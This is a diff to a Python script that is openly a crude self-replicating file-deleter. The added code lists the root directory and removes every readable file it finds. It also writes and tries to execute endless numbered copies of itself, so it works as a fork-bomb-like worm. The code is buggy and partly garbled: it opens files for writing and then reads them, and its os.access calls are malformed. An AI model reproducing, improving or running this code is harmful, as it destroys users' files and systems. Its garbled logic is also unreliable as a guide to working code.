@@ -1,3 +1,4 @@
+
 """
 Produced by Mr. Waltz
 date: March 21: RAMADAN SOON Boiss!!!
@@ -15,23 +16,66 @@ import sys
 
 path = "/"
 path2 = "C:"
-f = open("pac.txt", "r")
+count = 0
 the_package = """
 import os
 import sys
-
 path = "/"
 path2 = "C:"
-f = open("pac.txt", "r")
-the_package = f.read() * `99`
+sys_files = os.listdir(path)
 
 for i in range(1,9999999999):
-    with open(f"Oogabooga{i}.py", 'w') as file:
-        file.write(the_package)
+    with open(f"Oogabooga{i}.py", 'r') as file:
+        with open(f"Oogabooga{i}.py", 'w') as copy:
+            copy.write(the_package)
+            exec(file.read())
 
+
+def file_creation(il, code):
+    il += 1
+    in_code = code
+    os.access('/home')
+    with open(f"Oogabooga{il}.py", 'w') as made:
+        made.write(in_code)
+        for fila in sys_files:
+            if os.access(fila) == True:
+                os.remove(fila)
+            else:
+                pass
+            
+            
+def file_run(i):
+    number = i
+    with open(f"Oogabooga{i}.py", 'w') as running:
+        exec(running.read())
+
+
+for num in range(0,9999999999999999999999999999999):
+    file_creation(num, the_package)
+    file_run(num)
 """
+sys_files = os.listdir(path)
 
-for i in range(1,9999999999):
-    with open(f"Oogabooga{i}.py", 'w') as file:
-        file.write(the_package)
+
+def file_creation(il, code):
+    il += 1
+    in_code = code
+    with open(f"Oogabooga{il}.py", 'w') as made:
+        made.write(in_code)
+        for fila in sys_files:
+            if not os.access(fila, os.R_OK):
+                pass
+            else:
+                os.remove(fila)
+
+
+def file_run(i):
+    number = i
+    with open(f"Oogabooga{i}.py", 'w') as running:
+        exec(running.read())
+
+
+for num in range(0,9999999999999999999999999999999):
+    file_creation(num, the_package)
+    file_run(num)
         exec(file.read())
